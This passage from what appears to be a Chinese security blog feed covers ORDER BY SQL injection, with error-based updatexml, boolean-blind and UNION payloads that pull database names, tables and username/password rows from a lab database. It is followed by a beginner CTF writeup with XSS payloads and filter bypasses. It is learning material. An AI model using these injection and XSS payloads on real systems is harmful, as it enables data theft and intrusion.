and(updatexml(1,concat(0x7e,(select current_user())),0));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~root@localhost&#39;      &#x2F;&#x2F;获取当前用户名</span><br><span class="line">mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select system_user())),0));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~root@localhost&#39;        &#x2F;&#x2F;获取系统用户名</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/8166147-cbce1dead5116131.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><ul><li>获取数据信息</li></ul><p><strong>获取数据库个数</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select count(*) from information_schema.schemata)),0));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~11&#39;</span><br><span class="line">mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select count(schema_name) from information_schema.schemata)),0));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~11&#39;</span><br><span class="line">mysql&gt;</span><br><span class="line"></span><br><span class="line">注：count(*)是对结果函数统计，而count(schema_name)则是对不为空的行数结果进行统计</span><br></pre></td></tr></table></figure><p><strong>获取数据库列表信息</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)),0));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~information_schema&#39;</span><br><span class="line">mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 1,1)),0));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~challenges&#39;</span><br><span class="line">mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 2,1)),0));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~dvwa&#39;</span><br><span class="line">mysql&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注： 这里使用<code>limit</code>逐条获取，为什么这样呢？因为我发现使用<code>group_concat()</code>批量查询输出结果长度有限制，因此需要这样一条一条获取了，当然数据多的时候就要简单写个python脚本跑了</p><ul><li>获取某数据库表信息</li></ul><p><strong>获取表个数</strong></p><p><code>payload:</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(updatexml(1,concat(0x7e,(select count(*) from information_schema.tables where table_schema &#x3D; &quot;数据库名&quot;)),0))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select count(*) from information_schema.tables where table_schema &#x3D; &quot;security&quot;)),0));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~4&#39;</span><br><span class="line">mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select count(table_name) from information_schema.tables where table_schema &#x3D; &quot;security&quot;)),0));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~4&#39;</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><p><strong>获取表名</strong></p><p><code>payload:</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; &quot;数据库名&quot;)),0))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; &quot;security&quot;)),0));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~emails,referers,uagents,users&#39;</span><br><span class="line">mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema &#x3D; &quot;security&quot; limit 0,1)),0));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~emails&#39;</span><br><span class="line">mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema &#x3D; &quot;security&quot; limit 1,1)),0));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~referers&#39;</span><br><span class="line">mysql&gt; select * from users order by id and(updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema &#x3D; &quot;security&quot; limit 2,1)),0));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~uagents&#39;</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><ul><li>获取某数据库中某个表字段信息</li></ul><p><strong>字段个数</strong></p><p><code>payload:</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (updatexml(1,concat(0x7e,(select count(*) from information_schema.columns where table_schema &#x3D; &quot;数据库名&quot; and table_name &#x3D; &quot;表名&quot;)),0))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users order by id and (updatexml(1,concat(0x7e,(select count(*) from information_schema.columns where table_schema &#x3D; &quot;security&quot; and table_name &#x3D; &quot;users&quot;)),0));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~3&#39;</span><br><span class="line">mysql&gt; select * from users order by id and (updatexml(1,concat(0x7e,(select count(column_name) from information_schema.columns where table_schema &#x3D; &quot;security&quot; and table_name &#x3D; &quot;users&quot;)),0));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~3&#39;</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><p><strong>获取字段名，字段多的需要单条获取</strong></p><p><code>payload:</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; &quot;数据库名&quot; and table_name &#x3D; &quot;表名&quot;)),0))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users order by id and (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; &quot;security&quot; and table_name &#x3D; &quot;users&quot;)),0));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~id,username,password&#39;</span><br><span class="line">mysql&gt; select * from users order by id and (updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema &#x3D; &quot;security&quot; and table_name &#x3D; &quot;users&quot; limit 0,1)),0));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~id&#39;</span><br><span class="line">mysql&gt; select * from users order by id and (updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema &#x3D; &quot;security&quot; and table_name &#x3D; &quot;users&quot; limit 1,1)),0));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~username&#39;</span><br><span class="line">mysql&gt; select * from users order by id and (updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema &#x3D; &quot;security&quot; and table_name &#x3D; &quot;users&quot; limit 2,1)),0));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~password&#39;</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><ul><li>最后获取想要的信息就简单了</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users order by id and (updatexml(1,concat(0x7e,(select username,password from users limit 0,1)),0));</span><br><span class="line">ERROR 1241 (21000): Operand should contain 1 column(s)</span><br><span class="line">mysql&gt; select * from users order by id and (updatexml(1,concat(0x7e,(select username from users limit 0,1)),0));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~Dumb&#39;</span><br><span class="line">mysql&gt; select * from users order by id and (updatexml(1,concat(0x7e,(select password from users limit 0,1)),0));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~Dumb&#39;</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><blockquote><p>经测试，貌似只能指定获取一个字段信息</p></blockquote><hr><h6 id="order-by-与盲注"><a href="#order-by-与盲注" class="headerlink" title="order by 与盲注"></a>order by 与盲注</h6><blockquote><p>当页面没有展示MYSQL的错误信息时，且只能根据页面回显的状态进行判断时，可以使用<code>布尔盲注</code></p></blockquote><ul><li>简单看两条语句</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users order by id ^(select(select version()) regexp &#39;^aaaa&#39;);</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">13 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users order by id ^(select(select version()) regexp &#39;^5&#39;);</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">13 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/8166147-fe7ad1db6b5ddf48.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><blockquote><p>简单解释一下就是在<code>regexp </code>正则匹配的时候，如果<code>匹配到数据</code>返回<code>1(00000001)</code>的时候，此时的<code>1</code>会和<code>id</code>中的数据<code>的二进制</code>进行<code>异或</code>，按照<code>异或的结果</code>进行升序排列，所以显示的排列会发生变化；反之当进行正则匹配的时候，<code>未匹配到数据</code>返回<code>0(00000000)</code>，此时数字和<code>0</code>异或的结果还是本身，所以显示的排列<code>不会</code>发生改变。</p></blockquote><p><strong>总结：当页面<code>排序紊乱</code>时则说明正则<code>匹配到正确数据</code>，页面<code>排序未发生紊乱</code>时则说明正则<code>没有匹配到数据</code></strong></p><blockquote><p>通过以上可以判断数据库版本在5以上，这里的<code>&#39;^5&#39;</code>也可以转换成<code>^5的十六进制</code>。</p></blockquote><h6 id="order-by-与-union-联合查询"><a href="#order-by-与-union-联合查询" class="headerlink" title="order by 与 union 联合查询"></a>order by 与 union 联合查询</h6><hr><ul><li><p>当 <code>$query  = &quot;select * from users order by id $input &quot;; </code>没有使用括号包裹的时候，是<code>无法</code>直接使用union查询的。</p></li><li><p>当 <code>$query  = &quot;(select * from users order by id $input) &quot;;</code>使用括号进行包裹的时候，此时是<code>可以</code>进行union查询的。</p></li><li><p>获取版本号</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; (select * from users order by id ) union(select 1,(version()),3);</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">|  1 | 5.5.53   | 3          |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">14 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/8166147-f572ba275513423f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><ul><li>其他就不一一截图了,查询语句格式如下：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select * from users order by id ) union(select 1,(payload),3);</span><br></pre></td></tr></table></figure><p><code>数据库信息payload:</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">database()               &#x2F;&#x2F;获取当前数据库</span><br><span class="line">version()                &#x2F;&#x2F;获取数据库版本</span><br><span class="line">user()                   &#x2F;&#x2F;获取用户</span><br><span class="line">@@datadir                &#x2F;&#x2F;获取数据库路径</span><br><span class="line">@@version_compile_os     &#x2F;&#x2F;获取操作系统</span><br><span class="line">@@basedir                &#x2F;&#x2F;mysql安装路径</span><br><span class="line">session_user()           &#x2F;&#x2F;获取连接数据库的用户名</span><br><span class="line">current_user()           &#x2F;&#x2F;获取当前用户名</span><br><span class="line">system_user()            &#x2F;&#x2F;获取系统用户名</span><br></pre></td></tr></table></figure><p><code>表信息payload:</code> 同上，不再重复！</p><p>参考：</p><p><a href="https://www.freebuf.com/column/145988.html">https://www.freebuf.com/column/145988.html</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;em&gt;今天总结一下注入点在order by排序注入，学习一下记录下这个过程&lt;/em&gt;&lt;br&gt;&lt;strong&gt;声明：此文谨供学习记录研究使用，切勿用于非法用途，否则后果自负！&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="web安全" scheme="http://zzqsmile.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="sql注入" scheme="http://zzqsmile.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>CTF入门篇writeup——D0g3 Games</title>
    <link href="http://zzqsmile.github.io/2018/10/31/CTF/CTF%E5%85%A5%E9%97%A8%E7%AF%87writeup_D0g3Games/"/>
    <id>http://zzqsmile.github.io/2018/10/31/CTF/CTF%E5%85%A5%E9%97%A8%E7%AF%87writeup_D0g3Games/</id>
    <published>2018-10-31T01:00:00.000Z</published>
    <updated>2020-04-10T15:24:30.000Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p><em>今天在网上找到一个CTF的小游戏，题目我做了几道感觉挺简单，很适合入门，之前了解CTF，参加各种杯或者是看各种比赛题的writeup，感觉太难了，想到这我还是决定从点滴做起，记录一下学习过程，同时也想做一套CTF从入门到精通的教程。</em></p><p>网址：<a href="http://ctf.d0g3.cn/">http://ctf.d0g3.cn/</a></p><a id="more"></a><p><img src="https://upload-images.jianshu.io/upload_images/8166147-6c6700283ae29d17.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><strong>下面就简单记录下每道题的解题过程，希望能一点一点积累知识点</strong></p><h5 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h5><h6 id="1-GET"><a href="#1-GET" class="headerlink" title="1. _GET"></a>1. _GET</h6><ul><li>题目地址：<a href="http://106.12.21.77:8080/get/get.php">http://106.12.21.77:8080/get/get.php</a><br><img src="https://upload-images.jianshu.io/upload_images/8166147-3d20aa3c1979b4f8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></li><li>题目分析：很简单了，通过get接受一个变量<code>what</code>，其值等于<code>字符串flag</code>.</li><li>解题方法：</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/8166147-db704890658e1822.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><hr><h6 id="2-POST"><a href="#2-POST" class="headerlink" title="2. _POST"></a>2. _POST</h6><ul><li>题目地址：<a href="http://106.12.21.77:8080/post/post.php">http://106.12.21.77:8080/post/post.php</a></li></ul><p><img src="https://upload-images.jianshu.io/upload_images/8166147-7f9c3004d4988ddf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><ul><li>题目分析：同理同上，只不过通过POST方式传参。</li><li>解题方法：</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/8166147-0efffa5b7b297255.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><hr><h6 id="3-突破物理极限"><a href="#3-突破物理极限" class="headerlink" title="3. 突破物理极限"></a>3. 突破物理极限</h6><ul><li>题目地址：<a href="http://106.12.21.77:8080/length/length.html">http://106.12.21.77:8080/length/length.html</a></li></ul><p><img src="https://upload-images.jianshu.io/upload_images/8166147-69c14192b7e83954.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><ul><li>题目分析：根据提示输入<code>12345</code>提交，但是由于限制只能输入<code>123</code>，因此一看就知道要绕过限制</li><li>解题方法：方法不唯一可以抓包修改，也可以F12修改前端代码。</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/8166147-853c738f580cb3f4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-f13dfada568ca222.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><hr><h6 id="4-serialize"><a href="#4-serialize" class="headerlink" title="4. serialize"></a>4. serialize</h6><ul><li>题目地址：<a href="http://120.79.33.253:9001/">http://120.79.33.253:9001/</a></li></ul><p><img src="https://upload-images.jianshu.io/upload_images/8166147-fc81be98359aeea7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><ul><li>题目分析：题目还是很简单的，通过GET传参字符串<code>str</code>，将其传入的字符串通过<code>unserialize()</code>反序列化，使其反序列化结果值等于<code>$KEY</code>，于是解题方法就是传入事先通过<code>serialize()</code>函数序列化后的字符串。</li><li>解题过程：</li></ul><p><strong>先写个简单序列化字符串的脚本</strong></p><p>aaa.php </p><pre><code>&lt;?php$key = $_GET[&#39;key&#39;];    $str = serialize($key);echo &quot;$str&quot;;?&gt;</code></pre><p><strong>然后运行脚本，可以得到反序列化字符串脚本</strong></p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-7a46bbcbcebf25ee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><strong>最后我们解题</strong></p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-b6dec9cc2f541844.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><hr><h6 id="5-xss1"><a href="#5-xss1" class="headerlink" title="5. xss1"></a>5. xss1</h6><ul><li>题目地址：<a href="http://206.189.214.99:4080/xss/">http://206.189.214.99:4080/xss/</a></li></ul><p><img src="https://upload-images.jianshu.io/upload_images/8166147-eac89b94a768b670.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-fdf1ade9273e4b1d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><ul><li>题目分析：这道题是考察xss漏洞的，根据提示弹窗即可，想必也是讲xsspayload作为参数值传入，那就随便输入值提交后先查看看页面源代码吧。</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/8166147-71119eeacadb2bf8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><ul><li>解题方法：根据题目分析，构造payload传入到参数，很简单了。通过测试发现两个输出点，，第一个输出点实体编码了，因此根据第二个输出点构造payload。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: &quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/8166147-1e100cdff42a123b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><blockquote><p>哇，弹出俩QQ，加好友索要flag，666，怎么不弄个公众号自动获取呢？</p></blockquote><p>有趣的聊天截图，哈哈</p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-b8f73320fa8f8269.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p><hr><h6 id="6-htmlspecialchars"><a href="#6-htmlspecialchars" class="headerlink" title="6. htmlspecialchars"></a>6. htmlspecialchars</h6><ul><li>题目地址：<a href="http://120.79.33.253:9004/?id=111">http://120.79.33.253:9004/?id=111</a></li></ul><p><img src="https://upload-images.jianshu.io/upload_images/8166147-a48ecfad0a678146.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-9d8be3fd7de674c5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><ul><li>题目分析：哎，真麻烦，目标弹窗加qq，通过测试发现，后台使用<code>htmlspecialchars</code>对<code>&lt;&gt;</code>进行了HTML实体编码</li><li>解题方法：标签内构造XSSpayload</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: &#39; onmouseover&#x3D;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/8166147-b3d39a7021dfc55a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-af2c84a4f0e4e743.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><hr><h6 id="7-机器人"><a href="#7-机器人" class="headerlink" title="7. 机器人"></a>7. 机器人</h6><ul><li>题目地址： <a href="http://106.12.21.77:8080/robots/robots.html">http://106.12.21.77:8080/robots/robots.html</a></li></ul><p><img src="https://upload-images.jianshu.io/upload_images/8166147-24b160f474421618.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-5fb8cb2129676344.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><ul><li>题目分析：这道题凭直觉考察的是<code>robots.txt</code>，简单解释一下就是，为了防止搜索引擎的爬虫，通常在网站目录下会有一个<code>robots.txt</code>文件，来告诉搜索引擎哪些目录允许爬虫。那就试试呗。</li><li>解题方法：访问<code>robots.txt</code>文件。果然有收获，发现一个flag.txt的文件，然后顺利访问拿到flag。</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/8166147-f24825c38224ac9e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-2be4d888913862d0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><hr><h6 id="8-爆破拿flag"><a href="#8-爆破拿flag" class="headerlink" title="8. 爆破拿flag"></a>8. 爆破拿flag</h6><ul><li>题目地址：<a href="http://106.12.21.77:8080/burp/burp.html">http://106.12.21.77:8080/burp/burp.html</a></li></ul><p><img src="https://upload-images.jianshu.io/upload_images/8166147-228e4f50dc883502.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-92b3993f767f3280.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><ul><li>题目分析：也是很简单的一道题，5位数的密码，废话不多说，抓包爆破即可</li><li>解题方法：</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/8166147-f2377305faf13d4c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>耐心等待……</p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-260865018ba90b6c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>密码：12568</p><hr><h6 id="9-数字比较"><a href="#9-数字比较" class="headerlink" title="9. 数字比较"></a>9. 数字比较</h6><ul><li>题目地址：题目给的地址不能用，但是给了php文件，只能在自己环境里搭建咯。</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/8166147-93c9d23f078ceacc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><pre><code>&lt;?phperror_reporting(0);function noother_says_correct($temp)&#123;$flag = &quot;xxxxx&quot;;$one = ord(&#39;1&#39;); //ord — 返回字符的 ASCII 码值$nine = ord(&#39;9&#39;); //ord — 返回字符的 ASCII 码值$number = &#39;3735929050&#39;;// Check all the input characters!for ($i = 0; $i &lt; strlen($number); $i++)&#123;// Disallow all the digits!$digit = ord($temp&#123;$i&#125;);if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )&#123;// Aha, digit not allowed!return &quot;flase&quot;;&#125;&#125;if($number == $temp)return $flag;&#125;$temp = $_GET[&#39;password&#39;];echo noother_says_correct($temp);?&gt;</code></pre><ul><li>题目分析：这道题是数字比较，但是又不允许输入1到9数字，因此可以使用16进制来进行比较，即传入的参数值为<code>3735929050</code>的16六进制<code>deadc0da</code>，传入时候记得前面加<code>0x</code>。</li><li>解题方法：<br><code>payload: ?password=0xdeadc0da</code></li></ul><hr><h6 id="11-欢迎加入道格小组-伪造数据包来源来源"><a href="#11-欢迎加入道格小组-伪造数据包来源来源" class="headerlink" title="11. 欢迎加入道格小组(伪造数据包来源来源)"></a>11. 欢迎加入道格小组(伪造数据包来源来源)</h6><ul><li>题目地址：<a href="http://106.12.21.77:8080/referer/referer.php"> http://106.12.21.77:8080/referer/referer.php</a></li></ul><p><img 